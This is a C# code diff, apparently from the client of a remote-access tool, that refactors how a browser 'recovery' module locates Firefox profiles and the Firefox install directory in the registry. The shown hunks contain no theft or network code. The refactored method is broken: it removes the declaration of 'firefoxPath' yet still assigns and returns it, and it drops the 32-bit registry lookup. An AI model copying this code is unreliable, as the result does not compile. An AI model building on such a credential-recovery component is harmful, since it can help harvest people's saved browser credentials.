@@ -9,6 +9,8 @@ using xClient.Core.Data;
 using xClient.Core.Recovery.Utilities;
 using xClient.Core.Utilities;
 using System.Diagnostics;
+using xClient.Core.Extensions;
+using xClient.Core.Helper;
 
 namespace xClient.Core.Recovery.Browsers
 {
@@ -186,7 +188,7 @@ namespace xClient.Core.Recovery.Browsers
             if (profiles.Length == 0)
                 throw new IndexOutOfRangeException("No Firefox profiles could be found");
 
-            // return first profile, fuck it.
+            // return first profile
             return profiles[0];
         }
         private static FileInfo GetFile(DirectoryInfo profilePath, string searchTerm)
@@ -199,46 +201,29 @@ namespace xClient.Core.Recovery.Browsers
         }
         private static DirectoryInfo GetFirefoxInstallPath()
         {
-            DirectoryInfo firefoxPath = null;
             // get firefox path from registry
-            // we'll search the 32bit install location
-            RegistryKey localMachine1 = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Mozilla\Mozilla Firefox", false);
-            // and lets try the 64bit install location just in case
-            RegistryKey localMachine2 = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Wow6432Node\Mozilla\Mozilla Firefox", false);
-
-            if (localMachine1 != null)
+            using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine,
+                    @"SOFTWARE\Wow6432Node\Mozilla\Mozilla Firefox"))
             {
-                string[] installedVersions = localMachine1.GetSubKeyNames();
+                if (key == null) return null;
+
+                string[] installedVersions = key.GetSubKeyNames();
+
                 // we'll take the first installed version, people normally only have one
                 if (installedVersions.Length == 0)
                     throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");
 
-                RegistryKey mainInstall = localMachine1.OpenSubKey(installedVersions[0]);
+                using (RegistryKey mainInstall = key.OpenSubKey(installedVersions[0]))
+                {
+                    // get install directory
+                    string installPath = mainInstall.OpenReadonlySubKeySafe("Main")
+                        .GetValueSafe("Install Directory");
 
-                // get install directory
-                string installString = (string)mainInstall.OpenSubKey("Main").GetValue("Install Directory", null);
+                    if (string.IsNullOrEmpty(installPath))
+                        throw new NullReferenceException("Install string was null or empty");
 
-                if (installString == null)
-                    throw new NullReferenceException("Install string was null");
-
-                firefoxPath = new DirectoryInfo(installString);
-            }
-            else if (localMachine2 != null)
-            {
-                string[] installedVersions = localMachine2.GetSubKeyNames();
-                // we'll take the first installed version, people normally only have one
-                if (installedVersions.Length == 0)
-                    throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");
-
-                RegistryKey mainInstall = localMachine2.OpenSubKey(installedVersions[0]);
-
-                // get install directory
-                string installString = (string)mainInstall.OpenSubKey("Main").GetValue("Install Directory", null);
-
-                if (installString == null)
-                    throw new NullReferenceException("Install string was null");
-
-                firefoxPath = new DirectoryInfo(installString);
+                    firefoxPath = new DirectoryInfo(installPath);
+                }
             }
             return firefoxPath;
         }
